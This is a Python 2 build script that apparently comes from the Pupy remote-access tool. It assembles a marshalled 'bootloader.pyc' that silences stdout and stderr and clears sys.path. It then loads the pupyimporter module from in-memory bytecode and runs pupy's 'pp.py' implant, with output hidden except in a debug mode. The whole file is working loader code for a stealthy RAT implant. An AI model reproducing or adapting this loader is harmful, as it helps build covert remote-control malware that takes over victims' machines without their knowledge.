#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import marshal
import struct
import base64
import os.path


remove_stdout="""
import sys
class Blackhole(object):
	softspace = 0
	def read(self):
		pass
	def write(self, text):
		pass
	def flush(self):
		pass
sys.stdout = Blackhole()
sys.stderr = Blackhole()
del Blackhole
"""

if len(sys.argv)==2 and sys.argv[1].strip().lower()=="debug":
	remove_stdout="print 'DEBUG activated'\n"

def get_load_module_code(code, modulename):
	loader="""
import marshal, imp, sys
fullname={}
mod = imp.new_module(fullname)
mod.__file__ = "<bootloader>\\%s" % fullname
exec marshal.loads({}) in mod.__dict__
sys.modules[fullname]=mod
	""".format(repr(modulename),repr(code))
	return loader


if __name__=="__main__":
	code_bytes=[]
	code=""
	code_bytes.append(compile(remove_stdout, "<string>", "exec"))
	code_bytes.append(compile("import sys; sys.path = [];", "<string>", "exec"))
	with open(os.path.join("..", "..", "pupy", "packages","all", "pupyimporter.py")) as f:
		code=f.read()

	code=marshal.dumps(compile(code, '<string>', 'exec'))

	code_bytes.append(compile(get_load_module_code(code,"pupyimporter")+"\n", "<string>", "exec"))
	code_bytes.append(compile("import pupyimporter;pupyimporter.install();\n", "<string>", "exec"))
	code_bytes.append(compile("import encodings;\n", "<string>", "exec"))
	with open(os.path.join("..",'..','pupy',"pp.py")) as f:
		code=f.read()
	code_bytes.append(compile(code+"\n", "<string>", "exec"))
	code_bytes=marshal.dumps(code_bytes)
	with open(os.path.join("resources","bootloader.pyc"),'wb') as w:
		w.write(code_bytes)
